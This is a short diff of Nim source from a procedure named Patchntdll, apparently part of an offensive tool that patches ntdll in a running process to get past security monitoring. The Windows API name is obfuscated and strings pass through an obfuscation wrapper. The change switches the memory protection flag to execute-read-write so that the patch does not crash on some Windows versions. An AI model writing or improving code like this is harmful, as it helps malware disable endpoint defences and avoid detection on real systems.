@@ -148,7 +148,8 @@ proc Patchntdll(): bool =
         var protectAddress = cs
 
         var friendlycodeLength = cast[SIZE_T](patch.len)
-        success = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
+        # Some Windows Versions dont like READWRITE for this API and the process crashes
+        success = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
         if (success != 0):
             echo obf("uashdiasdj failed")
             break
